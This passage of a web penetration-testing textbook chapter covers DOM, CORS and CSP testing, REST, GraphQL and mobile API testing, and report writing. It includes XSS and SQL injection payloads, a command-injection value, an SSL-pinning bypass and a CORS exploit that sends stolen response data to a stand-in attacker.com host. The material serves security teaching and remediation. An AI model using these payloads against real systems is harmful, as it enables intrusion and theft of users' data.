   - Client-side input processing
   - DOM-based XSS
   - Client-side redirects

2. **Testing DOM Vulnerabilities**:
   - Source and sink identification
   - JavaScript code review
   - Input manipulation
   - Browser debugging tools

3. **Common DOM Vulnerabilities**:
   - innerHTML manipulation
   - document.write usage
   - location/URL handling
   - eval() and similar functions

```javascript
// Example: DOM vulnerability testing

// Step 1: Identify sources (user-controllable data)
// Common sources:
location
location.href
location.hash
location.search
document.referrer
document.URL
window.name
document.cookie
localStorage/sessionStorage
postMessage data

// Step 2: Identify sinks (potentially dangerous methods)
// Common sinks:
document.write()
innerHTML
outerHTML
insertAdjacentHTML()
eval()
setTimeout() / setInterval()
location / location.href
jQuery methods ($(), html(), etc.)
element.src / element.setAttribute()

// Step 3: Example vulnerable code
// URL: https://example.com/page.html#name=user
var pos = document.URL.indexOf("name=") + 5;
var name = document.URL.substring(pos, document.URL.length);
document.getElementById("greeting").innerHTML = "Hello, " + name;

// Step 4: Exploit payload
// URL: https://example.com/page.html#name=<img src=x onerror=alert(document.cookie)>

// Step 5: Testing with browser console
// Inject test payload via console:
document.getElementById("greeting").innerHTML = "Hello, <img src=x onerror=alert(document.cookie)>";

// Step 6: Client-side redirect vulnerability
// Vulnerable code:
var redirect = location.hash.substring(1);
if (redirect) {
    window.location = redirect;
}

// Exploit:
// https://example.com/page.html#javascript:alert(document.cookie)
```

### 6.2 Cross-Origin Resource Sharing (CORS) Issues

Exploiting misconfigured CORS policies:

1. **CORS Concepts**:
   - Same-origin policy
   - Cross-origin requests
   - CORS headers
   - Preflight requests

2. **CORS Vulnerabilities**:
   - Overly permissive CORS policies
   - Insecure origin validation
   - Credential exposure
   - Null origin handling

3. **Testing CORS Configurations**:
   - Header analysis
   - Origin manipulation
   - Credential inclusion
   - Null origin requests

```bash
# Example: CORS misconfiguration testing

# Step 1: Test basic CORS configuration
curl -I -H "Origin: https://attacker.com" https://example.com/api/user

# Step 2: Check response headers
# Look for:
# Access-Control-Allow-Origin: https://attacker.com
# Access-Control-Allow-Credentials: true

# Step 3: Test null origin
curl -I -H "Origin: null" https://example.com/api/user

# Step 4: Test subdomain bypass
curl -I -H "Origin: https://evil.example.com" https://example.com/api/user

# Step 5: Test partial string matching bypass
curl -I -H "Origin: https://exampleattacker.com" https://example.com/api/user

# Step 6: Exploit CORS misconfiguration (JavaScript)
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        fetch('https://attacker.com/steal?data=' + encodeURIComponent(xhr.responseText));
    }
}
xhr.open('GET', 'https://example.com/api/user', true);
xhr.withCredentials = true;  // Include cookies
xhr.send(null);
```

### 6.3 Content Security Policy (CSP) Bypass

Circumventing CSP protections:

1. **CSP Fundamentals**:
   - CSP header syntax
   - Directive types
   - Reporting mechanisms
   - CSP levels and browser support

2. **CSP Bypass Techniques**:
   - Unsafe inline scripts
   - Unsafe eval usage
   - Whitelisted domains
   - JSONP endpoints
   - DOM-based bypasses

3. **Testing CSP Effectiveness**:
   - Header analysis
   - Policy evaluation
   - Bypass attempts
   - Report-uri monitoring

```bash
# Example: CSP bypass testing

# Step 1: Analyze CSP header
curl -I https://example.com | grep Content-Security-Policy

# Step 2: Check for unsafe directives
# Look for:
# 'unsafe-inline'
# 'unsafe-eval'
# data: URIs
# Overly permissive domains (e.g., *.googleapis.com)

# Step 3: Test for JSONP endpoints in whitelisted domains
# If script-src includes trusted.com:
# Check if https://trusted.com/jsonp?callback=alert(document.domain) works

# Step 4: Test for DOM XSS with whitelisted scripts
# If angular.js is allowed:
# Try {{constructor.constructor('alert(document.domain)')()}}

# Step 5: Test for dangling markup injection
# If CSP blocks script but not other tags:
<img src='https://attacker.com/
<script>alert(1)</script>
'>

# Step 6: Test for CSP in reporting mode
# If Content-Security-Policy-Report-Only is used:
# Exploits will still work but will be reported

# Step 7: JavaScript for testing CSP bypass
fetch('/api/get-csp-report', {
    method: 'POST',
    body: JSON.stringify({
        'csp-report': {
            'document-uri': document.location.href,
            'violated-directive': 'script-src',
            'effective-directive': 'script-src',
            'original-policy': document.querySelector('meta[http-equiv="Content-Security-Policy"]').content,
            'disposition': 'enforce',
            'blocked-uri': 'inline',
            'line-number': 1,
            'source-file': document.location.href
        }
    })
});
```

> **Hands-on Exercise:** Set up a test environment with a web application that implements various client-side security controls (CORS, CSP, etc.). Attempt to bypass these controls using the techniques discussed in this section. For example:
> 1. Create a simple web page with a CSP policy and try to execute JavaScript despite the restrictions
> 2. Set up a CORS-enabled API endpoint with various configurations and test for misconfigurations
> 3. Identify DOM-based vulnerabilities in a JavaScript-heavy application
> 
> Document your findings, including successful bypass techniques and recommendations for proper implementation of these security controls.

## 7. API Security Testing

### 7.1 REST API Testing

Assessing the security of RESTful APIs:

1. **API Reconnaissance**:
   - API documentation
   - Endpoint discovery
   - Parameter identification
   - Authentication mechanisms

2. **Common API Vulnerabilities**:
   - Broken authentication
   - Excessive data exposure
   - Broken object level authorization
   - Mass assignment
   - Rate limiting issues

3. **API Testing Methodology**:
   - Authentication testing
   - Authorization testing
   - Input validation
   - Business logic testing
   - Output validation

```bash
# Example: REST API security testing

# Step 1: API discovery and documentation
# Look for:
# - Swagger/OpenAPI documentation (/swagger, /api-docs)
# - API endpoints in JavaScript files
# - Mobile app API calls

# Step 2: Authentication testing
# Test for missing authentication
curl https://example.com/api/users

# Test for weak authentication
curl -H "Authorization: Basic YWRtaW46YWRtaW4=" https://example.com/api/admin

# Test JWT vulnerabilities
# - Alg:none attack
# - Weak signature verification
# - JWT token cracking

# Step 3: Authorization testing
# Horizontal privilege escalation
curl -H "Authorization: Bearer USER_TOKEN" https://example.com/api/users/OTHER_USER_ID

# Vertical privilege escalation
curl -H "Authorization: Bearer USER_TOKEN" https://example.com/api/admin/users

# Step 4: Input validation
# SQL injection
curl "https://example.com/api/products?id=1' OR '1'='1"

# Command injection
curl -X POST https://example.com/api/ping -d "host=localhost; id"

# Step 5: Mass assignment vulnerability
# Original intended request:
curl -X POST https://example.com/api/users -d '{"name":"John","email":"john@example.com"}'

# Exploited request with additional fields:
curl -X POST https://example.com/api/users -d '{"name":"John","email":"john@example.com","role":"admin","verified":true}'

# Step 6: Rate limiting bypass
# Use different IP addresses
# Use different API keys
# Manipulate identifiers

# Step 7: API fuzzing with ffuf
ffuf -w paths.txt -u https://example.com/api/FUZZ -mc 200,201,401,403

# Step 8: Automated API scanning with OWASP ZAP
# Import OpenAPI/Swagger definition
# Run active scan against API endpoints
```

### 7.2 GraphQL Security Testing

Assessing the security of GraphQL APIs:

1. **GraphQL Basics**:
   - Schema and types
   - Queries and mutations
   - Resolvers
   - Introspection

2. **GraphQL-Specific Vulnerabilities**:
   - Introspection exposure
   - Excessive data exposure
   - DoS via nested queries
   - Injection in resolvers
   - Improper authorization

3. **GraphQL Testing Methodology**:
   - Schema discovery
   - Query analysis
   - Authorization testing
   - Input validation
   - Resource consumption testing

```graphql
# Example: GraphQL security testing

# Step 1: Introspection query to discover schema
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}

# Step 2: Test for excessive data exposure
query {
  users {
    id
    username
    email
    password
    creditCardNumber
    role
  }
}

# Step 3: Test for broken access controls
query {
  user(id: "other-user-id") {
    email
    privateData
  }
}

# Step 4: Test for DoS via nested queries
query NestedQuery {
  users {
    friends {
      friends {
        friends {
          friends {
            friends {
              # Deeply nested query
            }
          }
        }
      }
    }
  }
}

# Step 5: Test for injection in resolvers
query {
  user(id: "1' OR '1'='1") {
    username
  }
}

# Step 6: Test for batching attacks
[
  { "query": "mutation { login(username: \"user1\", password: \"pass1\") }" },
  { "query": "mutation { login(username: \"user2\", password: \"pass2\") }" },
  { "query": "mutation { login(username: \"user3\", password: \"pass3\") }" }
  # ... hundreds more
]

# Step 7: Use specialized GraphQL testing tools
# - InQL (Burp Suite extension)
# - GraphQL Voyager
# - GraphQL Raider
```

### 7.3 Mobile API Testing

Assessing the security of APIs used by mobile applications:

1. **Mobile API Characteristics**:
   - Client certificates
   - Custom authentication schemes
   - API versioning
   - Mobile-specific endpoints

2. **Mobile API Vulnerabilities**:
   - Hardcoded credentials
   - Weak token generation
   - Insufficient transport security
   - Lack of certificate pinning
   - Excessive permissions

3. **Mobile API Testing Approach**:
   - Application decompilation
   - Traffic interception
   - Certificate pinning bypass
   - API endpoint discovery
   - Authentication testing

```bash
# Example: Mobile API security testing

# Step 1: Extract and decompile the mobile app
# For Android:
apktool d application.apk -o decompiled_app

# Step 2: Search for API endpoints and secrets
grep -r "https://" decompiled_app
grep -r "api" decompiled_app
grep -r "token" decompiled_app
grep -r "key" decompiled_app

# Step 3: Set up proxy for traffic interception
# Configure Burp Suite or OWASP ZAP as proxy
# Configure mobile device to use proxy
# Install proxy CA certificate on device

# Step 4: Bypass certificate pinning
# Option 1: Use Frida
frida -U -f com.example.app -l bypass-ssl-pinning.js --no-pause

# Option 2: Use Objection
objection --gadget com.example.app explore
android sslpinning disable

# Step 5: Analyze API traffic
# Capture authentication requests
# Identify token generation mechanisms
# Test token expiration and revocation

# Step 6: Test API authorization
# Access endpoints with different user tokens
# Attempt to access admin functionality
# Test for IDOR vulnerabilities

# Step 7: Test input validation
# Inject malicious payloads in API parameters
# Test for SQL injection, command injection, etc.
# Test file upload endpoints

# Step 8: Test rate limiting and brute force protection
# Attempt rapid API calls
# Test authentication brute force protection
```

> **Knowledge Check:** What are the key differences between testing traditional web applications and testing APIs (REST, GraphQL, etc.)? How do the security testing approaches differ, and what unique vulnerabilities might be present in each?

## 8. Web Application Penetration Testing Documentation

### 8.1 Vulnerability Documentation

Properly documenting discovered web vulnerabilities:

1. **Vulnerability Documentation Components**:
   - Vulnerability description and classification
   - Affected URLs and parameters
   - Technical details and proof of concept
   - Exploitation method and impact
   - Evidence (screenshots, HTTP requests/responses)

2. **Documentation Best Practices**:
   - Clear, concise descriptions
   - Reproducible steps
   - Evidence-based findings
   - Severity and risk ratings
   - Affected components inventory

3. **Documentation Tools**:
   - Penetration testing frameworks (Metasploit, Faraday)
   - Note-taking applications (CherryTree, OneNote)
   - Screenshot and screen recording tools
   - Vulnerability management platforms
   - Custom reporting templates

```markdown
# Example: Web vulnerability documentation template

## Vulnerability: SQL Injection in Search Function

### Description
The search functionality on the product search page is vulnerable to SQL injection attacks. The application does not properly sanitize or parameterize user input before including it in SQL queries, allowing an attacker to manipulate the underlying database queries.

### Affected Components
- URL: https://example.com/products/search
- Parameter: q (GET)
- Endpoint: /api/v1/products/search

### Technical Details
The application passes the search parameter directly into a SQL query without proper sanitization or parameterization. This allows an attacker to inject arbitrary SQL commands that will be executed by the database.

### Evidence

#### Request:
```http
GET /products/search?q=test'%20OR%20'1'='1 HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: text/html,application/xhtml+xml
```

#### Response:
```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

<html>
<!-- Response showing all products instead of just those matching "test" -->
</html>
```

#### Database Version Enumeration:
```http
GET /products/search?q=test'%20UNION%20SELECT%201,2,3,@@version,5,6,7--%20- HTTP/1.1
Host: example.com
```

[Screenshot of database version disclosure]

### Exploitation Method
1. Navigate to https://example.com/products/search
2. Enter the following payload in the search box: `test' UNION SELECT 1,2,3,4,5,6,7-- -`
3. Observe that the application returns column values 1-7, indicating the query has 7 columns
4. Use the UNION SELECT technique to extract sensitive information:
   - Database version: `test' UNION SELECT 1,2,3,@@version,5,6,7-- -`
   - Database user: `test' UNION SELECT 1,2,3,user(),5,6,7-- -`
   - Database tables: `test' UNION SELECT 1,2,3,table_name,5,6,7 FROM information_schema.tables-- -`

### Impact
This vulnerability allows an attacker to:
1. Extract sensitive data from the database
2. Bypass authentication mechanisms
3. Potentially modify or delete data in the database
4. In some cases, execute commands on the database server

### Remediation
1. Implement prepared statements or parameterized queries
2. Use an ORM framework that handles SQL escaping automatically
3. Apply input validation and sanitization
4. Implement least privilege database accounts
5. Enable database query logging and monitoring

### CVSS Score
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (Base Score: 9.8)
```

### 8.2 Remediation Recommendations

Providing actionable security recommendations:

1. **Effective Remediation Advice**:
   - Clear, specific instructions
   - Prioritized recommendations
   - Multiple mitigation options
   - Verification methods
   - Implementation considerations

2. **Types of Remediation**:
   - Code-level fixes
   - Configuration changes
   - Architectural improvements
   - Procedural controls
   - Compensating controls

3. **Remediation Prioritization**:
   - Risk-based approach
   - Quick wins vs. long-term solutions
   - Operational impact considerations
   - Resource requirements
   - Implementation complexity

```markdown
# Example: Remediation recommendations for common web vulnerabilities

## 1. Cross-Site Scripting (XSS)

### Finding
Multiple XSS vulnerabilities were identified in the application, including reflected XSS in the search functionality and stored XSS in the comment system.

### Remediation Steps
1. **High Priority**: Implement context-specific output encoding
   ```javascript
   // Instead of:
   element.innerHTML = userInput;
   
   // Use:
   element.textContent = userInput;
   // Or for HTML attributes:
   element.setAttribute('data-value', userInput);
   ```

2. **High Priority**: Implement Content Security Policy (CSP)
   ```http
   Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; object-src 'none';
   ```

3. **Medium Priority**: Use modern frameworks with built-in XSS protections
   - React, Angular, or Vue.js automatically escape values
   - Use their built-in templating mechanisms

4. **Verification**: Confirm fixes by testing with XSS payloads:
   ```
   <script>alert(document.cookie)</script>
   <img src=x onerror=alert(document.domain)>
   javascript:alert(document.cookie)
   ```

## 2. SQL Injection

### Finding
SQL injection vulnerabilities were identified in the product search and user profile functionality.

### Remediation Steps
1. **High Priority**: Use parameterized queries or prepared statements
   ```java
   // Instead of:
   String query = "SELECT * FROM products WHERE category = '" + userInput + "'";
   
   // Use:
   PreparedStatement stmt = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
   stmt.setString(1, userInput);
   ```

2. **High Priority**: Use ORM frameworks with built-in SQL injection protection
   ```python
   # Using SQLAlchemy (Python)
   products = session.query(Product).filter(Product.category == user_input).all()
   ```

3. **Medium Priority**: Implement input validation
   - Validate input against a whitelist of allowed characters
   - Convert numeric values to integers before use

4. **Medium Priority**: Apply least privilege principle
   - Use database accounts with minimal required permissions
   - Separate accounts for read and write operations

5. **Verification**: Test with SQL injection payloads:
   ```
   ' OR '1'='1
   ' UNION SELECT 1,2,3,4,5 --
   ```

## 3. Broken Authentication

### Finding
The application's authentication mechanism has several weaknesses, including lack of account lockout, weak password requirements, and insecure password reset functionality.

### Remediation Steps
1. **High Priority**: Implement account lockout after failed attempts
   ```
   # Pseudocode
   if failed_attempts >= 5:
       lock_account(user_id, duration=15_minutes)
       notify_user(user_id, "Account temporarily locked")
   ```

2. **High Priority**: Enforce strong password policy
   - Minimum length of 12 characters
   - Require combination of uppercase, lowercase, numbers, and special characters
   - Check against common password lists

3. **High Priority**: Secure password reset functionality
   - Use time-limited, single-use tokens
   - Send reset links to verified email addresses only
   - Implement rate limiting on reset requests

4. **Medium Priority**: Implement multi-factor authentication
   - TOTP (Time-based One-Time Password)
   - SMS or email verification codes
   - WebAuthn/FIDO2 support

5. **Verification**: Test authentication security with:
   - Brute force attempts
   - Password reset token manipulation
   - Session fixation attempts
```

### 8.3 Web Application Penetration Testing Reports

Creating comprehensive web application penetration testing reports:

1. **Report Components**:
   - Executive summary
   - Methodology
   - Findings and vulnerabilities
   - Risk assessment
   - Remediation recommendations
   - Technical appendices

2. **Report Types**:
   - Executive report (non-technical)
   - Technical report (detailed findings)
   - Remediation roadmap
   - Compliance-focused report
   - Re-test report

3. **Reporting Best Practices**:
   - Clear, concise language
   - Visual aids (charts, diagrams)
   - Risk-based prioritization
   - Actionable recommendations
   - Evidence-based findings

```markdown
# Example: Web Application Penetration Test Report Structure

# Web Application Penetration Test Report
## Application: Example E-commerce Platform
## Date: March 15, 2023

---

## 1. Executive Summary

### 1.1 Overview
This report presents the findings of a web application penetration test conducted for the Example E-commerce Platform between March 1-15, 2023. The assessment focused on identifying security vulnerabilities in the web application, API endpoints, and associated infrastructure.

### 1.2 Key Findings
- **Critical Risk (2)**: SQL injection in product search; stored XSS in product reviews
- **High Risk (4)**: Broken access controls; insecure direct object references; weak session management; XML external entity injection
- **Medium Risk (6)**: Cross-site request forgery; missing security headers; insecure file upload; open redirects; excessive data exposure in API; rate limiting issues
- **Low Risk (8)**: Information disclosure; cookie issues; outdated libraries; verbose error messages

### 1.3 Risk Summary Chart
[Insert risk distribution chart]

### 1.4 Recommendation Summary
Immediate actions required:
1. Implement parameterized queries for all database operations
2. Apply output encoding to prevent XSS attacks
3. Fix broken access controls in user profile functionality
4. Implement proper XML parsing configuration to prevent XXE

---

## 2. Methodology

### 2.1 Approach
The assessment followed the OWASP Testing Guide methodology:
1. Information gathering and reconnaissance
2. Configuration and deployment management testing
3. Identity management testing
4. Authentication testing
5. Authorization testing
6. Session management testing
7. Input validation testing
8. Error handling testing
9. Cryptography testing
10. Business logic testing
11. Client-side testing

### 2.2 Tools Used
- Web proxy: Burp Suite Professional, OWASP ZAP
- Vulnerability scanners: Nikto, OWASP ZAP, Burp Suite Scanner
- Exploitation: Custom scripts, SQLmap, XSStrike
- API testing: Postman, Insomnia
- Static analysis: SonarQube, OWASP Dependency Check

### 2.3 Scope
The assessment covered:
- Main e-commerce application (https://example.com)
- Admin portal (https://admin.example.com)
- Customer API (https://api.example.com/v1)
- Mobile API endpoints (https://api.example.com/mobile)

---

## 3. Detailed Findings

### 3.1 Critical Findings

#### 3.1.1 SQL Injection in Product Search (Critical)
**Affected Component**: Product search functionality (https://example.com/products/search)

**Description**: The product search functionality is vulnerable to SQL injection attacks. The application does not properly sanitize or parameterize the search parameter before including it in SQL queries.

**Evidence**: [Include screenshot of SQL injection and HTTP request/response]

**Impact**: An attacker could extract sensitive data from the database, including customer information and credentials. The vulnerability could also be used to modify or delete data, or potentially execute commands on the database server.

**Recommendation**: Implement parameterized queries or prepared statements for all database operations. Use an ORM framework that handles SQL escaping automatically.

#### 3.1.2 Stored XSS in Product Reviews (Critical)
...

### 3.2 High Risk Findings
...

### 3.3 Medium Risk Findings
...

### 3.4 Low Risk Findings
...

---

## 4. Remediation Roadmap

### 4.1 Immediate Actions (0-7 days)
...

### 4.2 Short-term Actions (7-30 days)
...

### 4.3 Long-term Actions (30-90 days)
...

---

## 5. Appendices

### 5.1 Testing Tools and Methodology
...

### 5.2 Exploitation Proof of Concept
...

### 5.3 OWASP Top 10 Coverage
...

### 5.4 Testing Timeline
...
```

> **Knowledge Check:** What are the key components of an effective web application penetration testing report? How should findings be prioritized and presented to maximize value for the organization?

## Summary

In this chapter, we've explored web application penetration testing in depth:

- The methodology and approaches for web application security testing
- Techniques for web application reconnaissance and mapping
- Common web vulnerabilities and their exploitation methods
- Advanced web application attacks and testing techniques
- Client-side vulnerabilities and testing approaches
- API security testing for REST, GraphQL, and mobile applications
- Documentation and reporting best practices for web application penetration tests

Web application security testing is a critical component of a comprehensive security program. By identifying and addressing web vulnerabilities before malicious actors can exploit them, organizations can significantly improve their security posture and reduce the risk of successful attacks.

## Additional Resources

### Books
- "The Web Application Hacker's Handbook" by Dafydd Stuttard and Marcus Pinto
- "OWASP Testing Guide" by OWASP Foundation
- "Web Application Security: A Beginner's Guide" by Bryan Sullivan and Vincent Liu
- "Real-World Bug Hunting" by Peter Yaworski
- "Bug Bounty Hunting Essentials" by Shahmeer Amir and Aditya Gupta

### Online Resources
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTricks Web Pentesting Guide](https://book.hacktricks.xyz/pentesting/pentesting-web)
- [OWASP API Security Top 10](https://owasp.org/www-project-api-security/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)

### Practice Platforms
- [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
- [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/)
- [Damn Vulnerable Web Application (DVWA)](https://github.com/digininja/DVWA)
- [bWAPP](http://www.itsecgames.com/)
- [Hack The Box](https://www.hackthebox.eu/)

## Next Steps

In the next chapter, we'll focus on mobile application penetration testing, exploring techniques for identifying and exploiting vulnerabilities in iOS and Android applications, including application reverse engineering, runtime manipulation, and secure storage assessment.

---

## Chapter Quiz

Test your understanding of web application penetration testing:

1. What are the key differences between passive and active reconnaissance in web application testing?
2. Explain the three types of Cross-Site Scripting (XSS) and how they differ from each other.
3. What is the difference between CSRF and SSRF vulnerabilities?
4. Describe three methods for testing API security that differ from traditional web application testing.
5. What are business logic flaws and why are they often missed by automated vulnerability scanners?

Good luck!
